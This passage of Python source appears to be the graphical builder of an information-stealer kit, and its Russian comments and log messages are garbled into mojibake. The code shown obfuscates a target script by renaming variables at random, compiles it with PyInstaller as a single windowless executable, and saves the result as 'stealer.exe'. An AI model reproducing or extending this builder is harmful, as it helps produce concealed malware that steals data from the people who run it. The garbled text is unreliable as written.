                            update_logs(f"–û—à–∏–±–∫–∞ –≤ –º–µ—Ç–æ–¥–µ 2: {str(basic_ex)}")
                    
                    # –ú–µ—Ç–æ–¥ 3: –í—Å—Ç—Ä–æ–µ–Ω–Ω–∞—è –ø—Ä–æ—Å—Ç–∞—è –æ–±—Ñ—É—Å–∫–∞—Ü–∏—è
                    if not obfuscation_success:
                        try:
                            update_logs("–ü–æ–ø—ã—Ç–∫–∞ –≤—Å—Ç—Ä–æ–µ–Ω–Ω–æ–π –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏ (–º–µ—Ç–æ–¥ 3)...")
                            
                            # –ß–∏—Ç–∞–µ–º —Ñ–∞–π–ª
                            with open(main_py_path, 'r', encoding='utf-8') as f:
                                code_content = f.read()
                            
                            # –ë–∞–∑–æ–≤–∞—è –≤—Å—Ç—Ä–æ–µ–Ω–Ω–∞—è –æ–±—Ñ—É—Å–∫–∞—Ü–∏—è - –ø—Ä–æ—Å—Ç–∞—è —Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞–Ω–∏—è –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö
                            import random
                            import string
                            import re
                            
                            def generate_random_var():
                                """–ì–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç —Å–ª—É—á–∞–π–Ω–æ–µ –∏–º—è –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π"""
                                length = random.randint(5, 10)
                                first_char = random.choice(string.ascii_letters)
                                rest_chars = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length - 1))
                                return first_char + rest_chars
                            
                            # –ó–∞–º–µ–Ω—è–µ–º –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–µ –∏–º–µ–Ω–∞ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö
                            var_to_obfuscate = ["data", "result", "response", "content", "file", "path", "config", "options", "params"]
                            for var in var_to_obfuscate:
                                new_var = generate_random_var()
                                pattern = r'\b' + re.escape(var) + r'\b'
                                code_content = re.sub(pattern, new_var, code_content)
                            
                            # –ó–∞–ø–∏—Å—ã–≤–∞–µ–º –æ–±—Ä–∞—Ç–Ω–æ
                            with open(main_py_path, 'w', encoding='utf-8') as f:
                                f.write(code_content)
                            
                            update_logs("–ö–æ–¥ —É—Å–ø–µ—à–Ω–æ –æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞–Ω –º–µ—Ç–æ–¥–æ–º 3 (–≤—Å—Ç—Ä–æ–µ–Ω–Ω–∞—è –æ–±—Ñ—É—Å–∫–∞—Ü–∏—è)")
                            obfuscation_success = True
                        except Exception as simple_ex:
                            update_logs(f"–û—à–∏–±–∫–∞ –≤ –º–µ—Ç–æ–¥–µ 3: {str(simple_ex)}")
                    
                    # –ï—Å–ª–∏ –Ω–∏ –æ–¥–∏–Ω –∏–∑ –º–µ—Ç–æ–¥–æ–≤ –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª
                    if not obfuscation_success:
                        update_logs("–í—Å–µ –º–µ—Ç–æ–¥—ã –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏ –Ω–µ —É–¥–∞–ª–∏—Å—å, –ø—Ä–æ–¥–æ–ª–∂–∞–µ–º –±–µ–∑ –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏")
                    
                except ImportError:
                    update_logs("–ú–æ–¥—É–ª–∏ –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã, –ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏–µ –±–µ–∑ –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏")
                except Exception as ex:
                    update_logs(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏: {str(ex)}")
                    update_logs("–ü—Ä–æ–¥–æ–ª–∂–µ–Ω–∏–µ –±–µ–∑ –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏...")
                
                # –ö–æ–º–ø–∏–ª—è—Ü–∏—è —Å PyInstaller
                try:
                    update_logs("–ó–∞–ø—É—Å–∫ PyInstaller...")
                    
                    # –§–æ—Ä–º–∏—Ä—É–µ–º –∫–æ–º–∞–Ω–¥—É PyInstaller
                    pyinstaller_cmd = [
                        sys.executable, 
                        "-m", 
                        "PyInstaller", 
                        "--onefile", 
                        "--noconsole"
                    ]
                    
                    if icon_path:
                        pyinstaller_cmd.extend(["--icon", icon_path])
                    
                    # –î–æ–±–∞–≤–ª—è–µ–º –ø—Ä–æ—Å—Ç–æ –∏–º—è —Ñ–∞–π–ª–∞, –ø–æ—Å–∫–æ–ª—å–∫—É –º—ã –±—É–¥–µ–º –∑–∞–ø—É—Å–∫–∞—Ç—å –∏–∑ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ build_temp
                    pyinstaller_cmd.append("main.py")
                    
                    # –í—ã–≤–æ–¥–∏–º –∫–æ–º–∞–Ω–¥—É –¥–ª—è –¥–∏–∞–≥–Ω–æ—Å—Ç–∏–∫–∏
                    update_logs(f"–ö–æ–º–∞–Ω–¥–∞: {' '.join(pyinstaller_cmd)}")
                    
                    # –ó–∞–ø—É—Å–∫–∞–µ–º PyInstaller –∫–∞–∫ –ø—Ä–æ—Ü–µ—Å—Å
                    result = subprocess.run(
                        pyinstaller_cmd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True,
                        encoding="utf-8",
                        cwd=os.path.dirname(main_py_path)  # –ó–∞–ø—É—Å–∫–∞–µ–º –≤ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ build_temp
                    )
                    
                    if result.returncode == 0:
                        update_logs("PyInstaller —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω")
                        
                        # –ò—â–µ–º —Å–æ–∑–¥–∞–Ω–Ω—ã–π exe —Ñ–∞–π–ª
                        dist_dir = os.path.join(build_dir, "dist")
                        if os.path.exists(dist_dir):
                            exe_files = [f for f in os.listdir(dist_dir) if f.endswith('.exe')]
                            
                            if exe_files:
                                exe_file = os.path.join(dist_dir, exe_files[0])
                                output_file = os.path.join(current_dir, "stealer.exe")
                                
                                # –ö–æ–ø–∏—Ä—É–µ–º —Ñ–∞–π–ª –≤ –∫–æ—Ä–Ω–µ–≤—É—é –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é
                                shutil.copy(exe_file, output_file)
                                update_logs(f"–°–±–æ—Ä–∫–∞ —É—Å–ø–µ—à–Ω–æ –∑–∞–≤–µ—Ä—à–µ–Ω–∞! –§–∞–π–ª —Å–æ–∑–¥–∞–Ω: {output_file}")
                                update_status("–°–±–æ—Ä–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞ —É—Å–ø–µ—à–Ω–æ.")
                            else:
                                update_logs("–û—à–∏–±–∫–∞: –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–π —Ñ–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ dist")
                                update_status("–û—à–∏–±–∫–∞ —Å–±–æ—Ä–∫–∏")
                        else:
                            update_logs(f"–û—à–∏–±–∫–∞: –î–∏—Ä–µ–∫—Ç–æ—Ä–∏—è {dist_dir} –Ω–µ –Ω–∞–π–¥–µ–Ω–∞")
                            update_status("–û—à–∏–±–∫–∞ —Å–±–æ—Ä–∫–∏")
                    else:
                        update_logs(f"–û—à–∏–±–∫–∞ PyInstaller, –∫–æ–¥ –≤–æ–∑–≤—Ä–∞—Ç–∞: {result.returncode}")
                        update_logs(f"–í—ã–≤–æ–¥: {result.stdout}")
                        update_logs(f"–û—à–∏–±–∫–∏: {result.stderr}")
                        update_status("–û—à–∏–±–∫–∞ —Å–±–æ—Ä–∫–∏")
                
                except Exception as ex:
                    update_logs(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ PyInstaller: {str(ex)}")
                    update_status("–û—à–∏–±–∫–∞ —Å–±–æ—Ä–∫–∏")
                    
                # –û—á–∏—Å—Ç–∫–∞ –≤—Ä–µ–º–µ–Ω–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤
                try:
                    update_logs("–û—á–∏—Å—Ç–∫–∞ –≤—Ä–µ–º–µ–Ω–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤...")
                    # –û—Å—Ç–∞–≤–ª—è–µ–º build_temp –Ω–∞ —Å–ª—É—á–∞–π –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç–∏ –æ—Ç–ª–∞–¥–∫–∏
                except Exception as cleanup_ex:
                    update_logs(f"–ü—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ –ø—Ä–∏ –æ—á–∏—Å—Ç–∫–µ: {str(cleanup_ex)}")
            
            except Exception as ex:
                update_logs(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–¥–≥–æ—Ç–æ–≤–∫–µ —Å–±–æ—Ä–∫–∏: {str(ex)}")
                update_status("–û—à–∏–±–∫–∞ —Å–±–æ—Ä–∫–∏")
        
        # –ó–∞–ø—É—Å–∫–∞–µ–º –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ
        thread = threading.Thread(target=run)
        thread.daemon = True
        thread.start()

    def start_building(e):
        # –ò—Å–ø–æ–ª—å–∑—É–µ–º –º–Ω–æ–≥–æ–ø–æ—Ç–æ—á–Ω—ã–π –ø–æ–¥—Ö–æ–¥ –≤–º–µ—Å—Ç–æ –∞—Å–∏–Ω—Ö—Ä–æ–Ω–Ω–æ–≥–æ
        # –≠—Ç–æ –±–æ–ª–µ–µ –Ω–∞–¥–µ–∂–Ω—ã–π —Å–ø–æ—Å–æ–±, —Ä–∞–±–æ—Ç–∞—é—â–∏–π –≤–æ –≤—Å–µ—Ö –≤–µ—Ä—Å–∏—è—Ö Flet
        simulate_building_sync()
    
    def check_dependencies():
        import threading
        
        def run():
            update_logs("–ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã—Ö –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π...")
            try:
                # –í—ã–∑—ã–≤–∞–µ–º —Ñ—É–Ω–∫—Ü–∏—é –ø—Ä–æ–≤–µ—Ä–∫–∏ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π –∏–∑ –º–æ–¥—É–ª—è builder
                if hasattr(builder_module, 'check_requirements'):
                    result = builder_module.check_requirements()
                    if result:
                        update_logs("–í—Å–µ –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ã!")
                    else:
                        update_logs("–ù–µ –≤—Å–µ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ã. –ó–∞–ø—É—Å—Ç–∏—Ç–µ builder.py –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏.")
                else:
                    update_logs("–§—É–Ω–∫—Ü–∏—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞ –≤ –º–æ–¥—É–ª–µ builder.")
            except Exception as e:
                update_logs(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π: {str(e)}")
        
        thread = threading.Thread(target=run)
        thread.daemon = True
        thread.start()

    # –û—Å–Ω–æ–≤–Ω–æ–π –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä —Å –∫–æ–Ω—Ç–µ–Ω—Ç–æ–º
    content = Container(
        content=Column(
            [stealer_section],
            scroll=ft.ScrollMode.AUTO
        ),
        padding=20,
        expand=True,
    )
    
    # –û—Å–Ω–æ–≤–Ω–æ–π –º–∞–∫–µ—Ç
    page.add(
        header,
        Row(
            controls=[
                sidebar,
                content,
            ],
            expand=True,
            spacing=0,
        )
    )

ft.app(target=main) 